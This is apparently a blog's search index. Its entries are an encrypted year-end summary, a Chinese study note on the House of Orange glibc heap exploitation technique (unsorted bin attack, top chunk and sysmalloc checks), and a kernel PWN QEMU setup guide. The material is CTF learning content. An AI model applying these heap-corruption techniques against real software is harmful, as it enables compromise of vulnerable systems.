<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024年度总结</title>
    <url>/2025/01/26/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="78d3f35f3c3115dd9206142e175aebe0061fa9bc03fdf31b9a527e0e0c9bd40d">1dda5ab2390e0939d2ef7ca01defc37b29ed6e7d5315b6631e3ce758cb5227aba4e29bb271125c331feaf436a85eabd369f01571a8d538076f3272f9b5052e02387cf667080b4d8bc9b5316e77f7cb99cb0a6592f10472c441346fc2c0d8e49abb9cf9839f268c31a967bdad4af1f48b469edee45ecab9456497b8f095fcebc8f66ca6437135cda5539703fafc144bb617a5751d678199134756d27885416adeb6ba9072ea3fe90eb0b62f357930b764566559d88f3098f2181bafbbc5be561700169963ea1f0d09928f57f44423aa12696d3ed2b4ba001691ee5dbea85c8e3f5cdf2baf6c6a3583e44888d0e2488d6e209565c8d0c4ee1716c7bed0d0c16653b495285e6bd21f0a43923e0a89c427804989efbd8e80d6d01ac9c6fd3d394067b521fd4c3fa96d74dba44b0edef83fc4a2e208983c9e707ce6f1a4f16841e6c915b4d2dcdb271ce6597874d7cd4790a0cc3e8eba2cf94b4c14c06db451ce778299d232645a606c736d1d0b53dd11927688dcac8b36927b4d00c69db55cf8d64033887f3c40f1ad9cf6cbb1ab67c897186b5aed53ff6f7597dd120cdaa2d9c6f1ee56eb293e2978056c8234e8d298fb048ffa77be164512afd39d80d3da583c7462fcaffe13da471923a53860599ad8ae6824409e6903257763d1cbcf74befe4716f4b8cd55a8d050f724fd770bfb56eb4a6f0ad9d021177fac3bfcf548148fb89e4d82be4cb0ccaf3823c90208c0f44fe295c857019f355828fa02158bc05dbd5127fb97a8951d9f4aa4d9dc5eef5ff65dbea9c6a3aa804a13d453f59ba018fd810982413048b40c7bead50931978edfea620376920dd112a2a01afed1d3046b9e59d014451124ba0a100b191453d2263bb712d495ec73fbf5ba877fdaf4a9b4fffcc61887a0bd3d4510947ab874d5eb66e09291cd1a47e6413d2c35c5dd28f6148befe22462b84e53bc8794b45c7686eb372a089eb0ab9ece29bc075b410f769d94865134f97f05d876c36b0872ee8b5208094526db393a1840d638b2d831f06639f24daf8dccec00729800e8461159c2568fa6c385075acae765ac61387a7975f13193633157a6351829a3fee829e9490212fc2d06cba5912e8e9a894b634ec1ccd2e131bf8b59b1ac513390f3af624ed766c8558c4104ac6ade149a606268e3b7b178252961f85e4c0388393e05260546b54bd5fda26d123ce682a07abd3d605fcc30c5d7a1e06c7c64827c21d76b8a113c20ec4fdc3b7f07761ff69b7c55a127dcfbfe5c57e555e4e491c37a3a5dec6fa0845af554f31f1b74d2ad976c9a5c12bddc5f4148ca70e399e77a36054261d32cf4763140e40e15612fcae7e8587768a8260ed293499630630227b5c02d4c48321e4dca1e24808b015f215e765ac6a8a99cd0f14991efa350c955d9eec84b863ee2ec701b2cb9105c54ebdc746177775d4c679892b142d56e87947091a65a96b16bd457739d5d7b5722406eb2b37352afd7fa7452100f856b1cce4cfa11dff31db46ec0748d60ee5fb08c75de0821c92e69d275eaf02a511d0599f8caaa34a3458b475a75874b1cb6994f666d7b5b37e4113d59cd1e9caf765fb32fd5d3b0861d7ad27c79c80ed147cc98aff16e206d9daef58ff6202f345c594f74d3e6302cccff90d08d22b12967be775f2f2e80b7fd6117b80624792892c90f4d9b9fd70fd463e523800580e0a061d7972cc5fccc12442942fbb53d59cf4d823fba225e2ed6f3f5b3efaa821078cba172ec2f494b1974cb5f1b9f9860b6c317fcd421e966c634b92420c576e98e987aaaa81b3586fe0a80ccfd75ec86d46d3c11cd32d8f3503465bbe2dd8ff851337eb599b31349c8f004148cbd912c851cdffa3f28d670114fdf00bea1f5ec1295b489f55f528d323cbe2e58f291af0f914d576e2fc04c388af8111e054c37137971c6decf233c288648da26cbfd6a7e6041d48a9390f8063d849618bd44c7c0e37a84a9cfdea1cd23318f18ba4f4591df4ec6bd0ecda5b199223c66ce7e9dffda00926f677b7189e022ab53e999d80bb247393f7bb90a1285a490b7632b34feb15214263e2be9f54f373e98f49bb6fcd75654814e6a3c75de9554fb0e972e6f06b3d8924cdefca77d854037addf9f2614d3642993f8bedc3d20ea062307220e11f4145fb01c27ca2b89b3c0c4fba94399d44f8fd5f5b700d5174fa0bc6fc50c6f76a70d5ea836f796fcef120b6d0bccccc43b2baa6a636c44b6a87df134d852d25f41c0ff5e81b7a4d178e6e2a1c498e4a04e7e557782bdc043ff7d8feabbc3fa5e80ee6bb0a67c6900e449ffb02adbe1ef5533b0c6e0ba111881b4fd02f48feb2cf5d658cf12cf944c07d63906e6248a97775a6b1af8220ec619c4247ef5496a40485d463bbdff3415dd256122e23c10467ea1d6c0c53f96dfda102837d1b71498c66815114ca3630fe7eec8310f5c6ccb43cad30a07d2276935c5d0ce6d670cded90224e6ae133df45d07f803d2eac781c1abf7684a80f09c582f68455f39c47da93acaf3aa977dcb01c3962beb9e8e09ab2d143a3861a501c6d6d4d3d8304725a12a844debaa39895be489fee9f516facc13d2832223acc64ea162ee59d523fdbd3346d30f739c6095f60e11e2b1ea8a15a0bdd4ad155028826bb0eff3737b8c57570124d68c33ec9dc8115ce4824b436d58feb8fd0dcfa77da32bd03cf5d77da07c9ab23f5b6b8abf0ee8fd9b55a311e9e4c2eac241edac30122c2e5d49c23b9bdd2e4bd8c948d87e4f4f9823a6b45467b3c9132523462b07dd10eb690a2528993f7807fb2842bde6306cb3e4272fd12848589abefa29a4355da8ea7e2e71f1674d5c030ecb63d91cc14f31e0ff7e3f763213518f8a31f0c6bd44f239a3eaa52828ee5d2f0e34d12f775828897c8cd9d36977bcfa3730be8593bc55331ab925d000232eaea3aa8d25eac079b072af173fe3aaadf51be34142cf70daedb7ce60d51b1e0519cd922b9d905726bca1d2823e7b96f429858c34e85098024b3e863f32ec9fda5fecf72726b5cfc6effdfc2497781708576159f6ff6d786067614a52528b924b6322ca9f8a7d24a72fb99a872f66b34550fcae53ebdc2e9e6ef0874ef9759fd45ffdafc33d0025f0d6d5676998d90710b7c6f1daccfaf1c9c0fee241d11b5bf460dbca64b9106848a6a7b5d8af90e464f667c89263a5786affcf453a7b25d6230645fe9c732bc76902ada4b69237bf59b8e9ed0b17fced3ae9eae597656027cc086b67c878973601a1d736795ff412680d609ee04d74ba4443fe48d3a7ff15551dcc668b261365c9d87e24542e0ec5f9027a09f19373ed820b3a2a02203ec31c5229c124ace7aa1b9f64a4e1ef22d1f1048adb6029abdf54471f48493b504b79df1d43fd24f5c61257573df9ed9032cf25edf543ce6fb23922d9295e66abab1f2cc72d537f3902abe932781d50c0abf9cb1c6ef0a80e33e15919b3a85f089cd4c58a3cca06a7bf2d74b060f17dc5a109f73416b239bb73e993baa8f207bdc3ca303dc3ac79b897e92d9437f35076d84b7a9cb2e7f5cb878fbecdd122fd89b436d39c0db67ac492407e08d818a3ddee2452ae76dc430c2534a602bababea35d2584fc5d2d6d69723960dda838533430ebc33e733b275363a4da0772ddd8f6ef87119d503a2aad06b57de93f5e349bde176c195b372ed82685b17813b8ce18c174e04b8fc11d2c8c6c08c78e8c3e3b789dbacf463ae6fa388198d1b6879a7d188f2c09f734c185edeb5f25b815bbb4872e2a33a3ba37d4dabc256d0eedc69e352721763b883f1f176b69e4b61af966fe1b772b6ff686e4881f3a3bda1672121d828b98ddcb003ce917ea9704750d5a2cdb7976a1451f026c6aae804e91af3f3b5220145a253df388f77f47d1776dfb0b6612c4bba7b2f4a5487563c8f01134037cda921c95172c439de11d70d1e0a04304a11bee68eb396934aad12614eabe4f57791e2f9c59814b60bfb76eedacf04f3db83427f059a56d8a56a8d83f88069343b96f341df1fcdeadfb0cac98ed9d1716f93ff75afc3733f89bce6e360a7bbd586c285188c2054b03ec4b59c85ebe7fa639f54d8e93d5be72f6aa02dc2a4a406475db006f0b19a5b58556219485ad48f741be042607b580f74f85560b9af14aee690d94e76f6e8d7ae611e02ce0d226a5ad35239a4bac5b9f647f3f8d93d9719a4e20750a3069b98c34a423b6b9e4ecc4a71476f55f08696c03dce689b569b7cc1ff499042d510441f889b455dd9ec1eff412b9e061626b5d5b418cb669f3094fb5616e4d2763bc0b733b5e7c3a1161a740f1f261892df28dac4713bc9bafe7be65a9c206ada2b820ada6b1c66b4968e2a98ec967840c1d96e3d665555f0f20b36860654a06e1c067bdcaf71a0b2ed8173b1857020f3bd01d95132a8317a41cb89f464d02d9cfaea1534b3b9b37a53d1e2e943833a8e682e1f5c8bb8d31659c01cb13597f127997abe37fe3617cb1db8c2625741b83cec7c5cd05319fff18fcbd3602ed434c8208d72d7564239d6e9894d8aa5437e6ca309509609e35326a50ae6ccbd9a2936c5b7cf8eb209df6980115468b6cf415be284467e95c3183d4059b01b536887ebe52cc78618f5069a062ac6cc7f9593773973e28a7bf26637e79c372ee3194e8c1a6b0359d78f8d0fb649f1d5495c71fc3b4d22a0c14ee11163aa339ddc5614bf4f0b751a0fbe225a3ac3a4d2c952cfddec351da868b49e09bae36f185116062a933b88b501de2423dfefd4498d9b130a9476b34d0e144b9b64ec145aabadea1f17ca332d09dfb0bd04c2e40d3e667d86f612b9241853a98dfe335aaa7071389a99bd6a70e80645650076f78acbd4dd0f90f9d752dde22a9be174daa57157002d16bab3435b2f1e69dd0dc4d125586f6c37cd6c98bdd576b2cf706d239b7a2ba1b61c4cdffd505af326055417847d51fd599f2ab58219ef1b2f8e16f0fef71df612820a919364bfacff0e6cbf91344dd72fc4e8e18e9565e28f0bb37caf3492890ee3db8eb92cbafd209b0310824564fabe523b19d47213d22e79e20f0ae652c63ef4105d4fbdef642c57b9fa655a9ba4f94e463290fbcd3a375072c1e65b3344112e71696827134bb6a6ecd0cddb6177d93ee42975f0857123c7a42db9a6fec82879389b3adaead368a8355e0c9475ae9c1e8e4b214d141082eaa95027adc32494b163873ea9b3a75e557081fb371e031cfc98999ab581e3bd18b24e8061e997a7bc79f44b8cda31a58355cff208b51cafe3c904ff454f8ee4f1be24d01b99c2c0018de3b96751490b32d050e9e6933304ee86e43e313613a8a06b26484cc2fbf780674aa6ee9b30f1050202e91eba37050766b930c0771a78e4a95a8623345da67ba4be3f61b3a1bfd56a4cf22d070e180a6b7a4d49e1cafd39a9d1d76ad1e62d3f55864759654011e361571ab701a79e24fb9372b567f3118dbeba39ac3ec66e4d570c60e4685e873574d19cf29881cf60d97de5dcfd6092a2fac49e8da63859d189f17219bf1bd10fbbe8110457c460c1ec1ae6216463210516839cea88d99df9f4a453f84bbb9bbbc4c07a7c9e29f2705d11c41f2ca7bb0e5b9a1213694bc518207dfce1c374126ae747d348e530772f731a6b7659983671a350618d8cdb18b7683188bd26486bc052350eb904e8ce076288ffb8563b6d5cf803d839df08bf3bb2f3ab3c23b4d43ba5f49a37d5f800064524ab17293167a476934c118788113cae5181c12a231087ba4c094d3fab8c28a27746e2c9fd06c96cd3be763690d84e7c49b081cd394bdd2616153699d086b095e825ef05de2adfdc225e047aff0780887a02fb94e936ebb503b8042a5c18d2fd49aa4cb33baf1a96ab185b436834f032a5465680c292c12f43094976d00e39658be761ff0219b69baf27d782d4c195e556ba14f72dae52d14b5776016fe3ea39ce2ede9e30eeebf9ac0fb3824d22c5002c28e1104911954bef232dd74aab6b4a4428b514cd92f1db032cc89f2c7880e888d475169558c12eb200da0c8b4b59bd087ecb02a27affc04374f1b9f24f32b55bac3838142058eb95889d4286fbd058553d084c68fd62615fb6b34b8d1929f469fd7d61e9cebbe9806772d4aa9a67b81a9d7a379a457f00e788a5f14e570e5537342ba6864dd84e0665ea29bdd37e528684039baef701f1ef85ecfa1430f7203f852d0a9a792e4d2afaabaa3602f4c98f50efd8cbf17505ecfe1866621513eae812d4b829a497a1319db35084ee902cdf34bd4b8c45f76ede4a80b7ffc4d5faf8a4669f5d2d0da96863f5b93caaa1091fe8ced5ae09563220559c10eed1ca1ac1aed22282ad844de846c610eda0f9580622928257433851d4f0cb148a9fb868fb73b91646f4160588d7ef8148f58f6f5a03725a768be6a6e5a3eba96f4bb060539ee489de3da45ae98a72321502cda0e7792b523691d59316c1fa49fbb9eabf6e876c08d371f7355139355491366835a5927c69d6ac2777e0603ae078e863a818e0a13cc6f10143cc9d99bb88856f23da258bdeb343b87a4616c99ccbffba8bcd775ed181bd4e3748ebe6f5ece162e808d4404525dab4794c44dab0e3ac7bc40216ad33d6950a6f5c67f7998527156f63189b73ef2c0d7227a732a7fb87f5329630fe4fcdb9b23cb3bcf41093798b33be092d7ef22e7e38f9cc22379d6e7ee58dfac352da3a53bfa28304d6311ab1528ebd1cbeae72c81d7ead2148dfae73083f710af681b26f81b0253a6c0510a1979b6fc7e1cf73af49ee7ceef7c37ab83a96ac839fb76d4bc817f7f609dbe46ebc52cde93515fbad48c4505692b86240659226933e5078faabfc128faaed042d398b12e7610986417ad93823400c707ed79c3808b986ce31113e9b8d926ab21c34f547abd826b5deafc356305ec40c080a0eeaa4b5600813e3dba69af36c66e6491b95b30f5ed753f847dbe066ec84c45dba54d946dad5f25d1ba0068d12618c05a78a194aab6802a1d81ff5a7657baf61bcce228359cca80d7d8598041e3ec23049a9ae93dff661fb86af6a4a128d18727ce948ceae78ad3a38ad55c12b337ed56db3e6405008323eab2f29060da93ec239c42dc54caf577cd81ce2de2fd4da77c1f256b1eafd57f3936177ddd59889f30053379ff111898f0cfe30a91a90ca7ae909c468036388b45b71a5a100b0bac6781610f630e66b969f628a0e00d96f6c885286508a736b94b5efae1b3e8305d749f21369b5d81b6ab0d585d558ef39396c466ddc3e5ebea17f6e76ace34542e97e4e1921afca4ebee764c1e0ed116168f9557189dfe06523e88ac06aa0cbc29c196ab2b960e3253ce1737a1522ede5aa9bece92db9ce6c0174b3717083797d4d3b9b190fdda87a701d7c604c526f64031a0f8e2c45324a8734cd7ec50e7fbc282d690e113f8de9f4acdabe4a7082b912cb52848b8c4cb3d79e6d9b5d8afaa9b58341f498208a19b73c9c42b6249a88e2d13436d6f290f2d7ad16225e049bd9d0e2beaa5bf129d5973b77d0c09a3d2e1b4d88ddc4ac68bfe20f4fd337e4ffd56cf1748fdbf89ffa67d007f708f305580560a92cd68b4c6b92c875a9d397380702548330bcbf9bcaed32eba64af0f6eca399870e1b1a321d6412abf735064ab333bf6e54f4b2c9badadd2ccca7e2dae4719d16963d80370fb2c3ef659e18b79a553464b81f93b700c624e5d5d21d85db25fbb4610ea347c5d7b88320c04ed4938cc6f6c32e36dd93665321ae6dccdb199655ea99bcfed4f5261d51170dcb0b44bc762118e4adb963d479d18f5cb4a42a167eced6364542eeda91d2d5fcf347cd5660842fb667284741dd58f9dd92e4ca19522e699d76984cf663b379744b0d1dd40af0b51fafaa755099e0d55eddcbe5a9d26744ac9d475192aa5e94147f8a1c5ffc7e2446bb2eb84e1d2f0dc30c28c7867d4607b606e56a3e5dfb4d67ba6406d76c63ef917f3696ba8951c5c614b534c5bc4ffd4fb8ae2</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">mick0960 access only!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>House系列学习</title>
    <url>/2024/12/21/House%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1>House of Orange</h1>
<p>主要是对之前所学习的内容进行细节补充</p>
<h2 id="概述">概述</h2>
<p>House of orange是一种针对低版本堆题无free函数来进行IO流攻击的手法。其大致思路为利用unsortedbin_attack劫持_IO_list_all指针，然后劫持_IO_FILE_plus的vtable来进行getshell</p>
<h2 id="前置知识——Unsortedbin-attack">前置知识——Unsortedbin attack</h2>
<p>Unsortedbin为一个双向链表，其内的堆采用FIFO进行管理这里直接分析一下<code>__int_malloc</code>中对unsortedbin进行操作的相关源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在fastbin,smallbin,largebin中都无法exact fit后，就进入了这个大循环在这个大循环中，首先循环检查unsortedbin中是否有堆块如果有的话，先设置<code>bck = victim-&gt;bk</code>然后检查<code>victim</code>大小是否合法接着检查所申请的<code>nb(normalized byte)</code>：</p>
<ol>
<li class="lvl-3">是否属于smallbin的大小</li>
<li class="lvl-3">当前victim是否为unsortedbin的最后一个堆</li>
<li class="lvl-3">当前堆的大小是否大于(用户申请的内存+MINSIZE)<br>
都未通过的话，则将当前chunk从unsortedbin链表中释放操作如下:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>正常的双向链表解链操作但是如果当unsortedbin中只有一个堆块，而该堆块的bk指针我们可以进行修改那么就可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>在任意位置写上unsorted_chunks (av)指针</p>
<h2 id="前置知识——top-chunk">前置知识——top chunk</h2>
<p>当用户申请的堆块，在各个bin中都无法满足后，则进入use top</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br></pre></td></tr></table></figure>
<p>在use top中，首先会判断当前top chunk的size是否大于用户申请的内存大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>不满足后，后面又涉及到另一个小trick</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">   here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里会检查fastbin中是否有chunk，有的话则进行合并，然后将合并后的堆，根据其大小分到不同的bin中到最后，才会做出响应用户申请内存的请求</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这里使用sysmalloc进行申请内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* definations */</span></span><br><span class="line">   <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">    ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在sysmalloc中，首先会检查申请的内存是否大于mmap的最小申请阈值即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span><br></pre></td></tr></table></figure>
<p>但对于house of orange来说，其申请的内存不会超过其值</p>
<p><img src="/images/pasted-19.png" alt="upload successful"><br>
在跳过这个检查后，开始进入几个断言检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;</span><br><span class="line">  old_size = chunksize (old_top);</span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">  <span class="comment">// old_end = (char *) (chunk_at_offset (old_top, old_size));</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
<p>对于第一个assert:</p>
<ol>
<li class="lvl-3">
<p>判断old_top的地址是否和刚生成时一样</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;size是否等于0</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;size是否大于0x10</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;prev_inuse是否等于1</p>
</li>
<li class="lvl-3">
<p>old_top是否为页对齐的</p>
</li>
</ol>
<h1>House of Pig</h1>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>House系列</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel PWN——内核编译以及模拟</title>
    <url>/2025/02/19/Kernel-PWN%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h1>编译</h1>
<p>内核版本下载，这里随便选一个LTS版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br></pre></td></tr></table></figure>
<p>下载完解压进入对应的目录来配置一些选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.4.98/</span><br><span class="line">make menuconfig <span class="comment"># Kernel hacking -&gt; Compile-time checks and compiler options -&gt; [*]Compile the kernel with debug info</span></span><br><span class="line">make -j3 bzImage</span><br></pre></td></tr></table></figure>
<p>编译好后会显示如下信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>
<p>编译便到此结束</p>
<h1>QEMU模拟</h1>
<p>这里首先需要安装busybox来模拟文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br></pre></td></tr></table></figure>
<p>然后进行配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="comment"># Setttings -&gt; [*] Build static binary (no shared libs)</span></span><br><span class="line"><span class="comment"># Linux System Utilities -&gt; [] Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</span></span><br><span class="line"><span class="comment"># Networking Utilities -&gt; [] inetd</span></span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br></pre></td></tr></table></figure>
<p>创建<code>_install</code>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
<p><font style="color:rgba(0, 0, 0, 0.87);">在 </font><code>_install</code><font style="color:rgba(0, 0, 0, 0.87);"> 目录下创建以下文件夹</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
<p>创建<code>init</code>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>随后在该目录下打包文件系统</p>
